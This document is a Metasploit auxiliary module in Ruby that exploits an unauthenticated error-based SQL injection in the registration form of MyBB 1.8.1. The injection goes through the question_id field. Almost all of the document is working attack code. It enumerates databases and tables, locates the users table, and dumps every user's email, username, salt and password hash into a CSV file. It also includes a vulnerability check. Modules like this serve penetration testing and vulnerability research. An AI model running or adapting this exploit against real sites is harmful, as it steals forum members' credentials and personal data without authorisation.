##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MyBB Username/Salt/Password hash/Email Enumeration via Unathenticated SQL injection",
      'Description'    => %q{

      This module will exploit an unauthenticated SQL injection in version 1.8.1 of MyBB
      in order to enumerate all the users, emails, salts, and password hashes and save
      them into a CSV file.
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry'
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35224/']
        ],
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 13 2014"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of MyBB installation', '/'])
      ], self.class)

  end

  def check
    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)
    taint = Rex::Text.rand_text_alpha(10)

    str = "' AND (SELECT 3167 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(0x#{taint.unpack("H*")[0]} AS CHAR),0x20)),1,50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'kZNg'='kZNg"

    res = send_injected_request(str)

    new_taint = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

    code = taint == new_taint ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
    return code
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    get_db_count = "' AND (SELECT 9495 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lERm'='lERm"

    res = send_injected_request(get_db_count)

    db_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

    dbs = []
    0.upto(db_count-1) do |i|
      str = "' AND (SELECT 5916 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'nlBo'='nlBo"
      res = send_injected_request(str)

      dbs << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    dbs.delete('performance_schema')
    dbs.delete('information_schema')
    dbs.delete('mysql')

    users = []
    dbs.each do |db|
      get_table_count = "' AND (SELECT 5761 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'suHI'='suHI"
      res = send_injected_request(get_table_count)

      table_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

      table = nil
      0.upto(table_count-1) do |i|
        str = "' AND (SELECT 2871 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'hpSP'='hpSP"
        res = send_injected_request(str)

        table = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
        table = nil if table !~ /users$/
        break if table
      end

      if table
        get_user_count = "' AND (SELECT 9028 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'nIPA'='nIPA"

        res = send_injected_request(get_user_count)

        user_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

        print_status("Getting #{user_count} users")
        0.upto(user_count-1) do |u|
          user = []
          ['email', 'username', 'salt', 'password'].each do |col|
            str = "' AND (SELECT 9393 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),1,50) FROM #{db}.#{table} ORDER BY salt LIMIT #{u},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'vocx'='vocx"
            res = send_injected_request(str)

            user << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

            vprint_status("Found #{col}: " + $1)
          end
          users << user
        end
      end
    end

    csv = 'email,username,salt,hash' + "\n"

    users.each do |user|
      csv << user[0] + "," + user[1] + "," + user[2] + "," + user[3] + "\n"
    end

    vprint_good(csv)

    path = store_loot("mybb.file", "text/plain", datastore['RHOST'], csv, 'mybb_users.csv')

    print_good("User list saved to #{path}")
  end

  def send_injected_request(str)
    post = {
      'regcheck1' => '',
      'regcheck2' => '',
      'username' => Rex::Text.rand_text_alpha(8),
      'password' => 'fdsafdsa',
      'password2' => 'fdsafdsa',
      'email' => 'fdsafdsa@fdsafdsa.com',
      'email2' => 'fdsafdsa@fdsafdsa.com',
      'referrername' => '',
      'imagestring' => '',
      'imagehash' => '',
      'answer' => '4',
      'question_id' => str,
      'allownotices' => 1,
      'receivepms' => 1,
      'pmnotice' => 1,
      'subscriptionmethod' => 0,
      'timezoneoffset' => 0,
      'dstconnection' => 2,
      'regtime' => '',
      'step' => 'registration',
      'action' => 'do_register',
      'regsubmit' => 'Submit Registration!'
    }

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'member.php'),
      'method' => 'POST',
      'vars_post' => post
    })
  end
end

